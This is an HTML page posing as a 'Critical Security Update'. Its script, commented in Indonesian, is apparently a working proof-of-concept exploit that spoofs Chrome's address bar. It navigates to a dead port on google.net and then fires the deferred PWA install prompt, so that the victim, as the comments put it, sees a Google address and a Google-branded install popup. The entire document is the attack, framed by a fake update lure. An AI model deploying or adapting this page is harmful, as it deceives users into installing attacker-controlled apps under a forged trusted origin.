<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="manifest" href="manifest.json">
<style>
  body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; display: none; }
</style>
</head>
<body>
  <h2>Critical Security Update</h2>
  <button class="btn" id="installBtn">Update Now</button>

<script>
let deferredPrompt;
const installBtn = document.getElementById('installBtn');

window.addEventListener('beforeinstallprompt', (e) => {
    e.preventDefault();
    deferredPrompt = e;
    installBtn.style.display = 'block';
});

installBtn.addEventListener('click', () => {
    // 1. OMNIBOX SPOOFING: Arahkan ke Google.net tapi di port yang MATI (misal port 81)
    // Chrome akan mencoba loading, Address Bar langsung berubah jadi "Google.net"
    window.location.href = "https://google.net:81";
    
    // 2. Selagi Chrome nge-freeze nungguin port 81, kita tembak UI Install PWA-nya!
    setTimeout(async () => {
        if (deferredPrompt) {
            deferredPrompt.prompt();
            // Sekarang korban melihat Address Bar "Google.net" DAN popup instalasi berlogo Google!
            deferredPrompt = null;
        }
    }, 1500); // Delay 1.5 detik nunggu Address Bar Chrome update
});
</script>
</body>
</html>
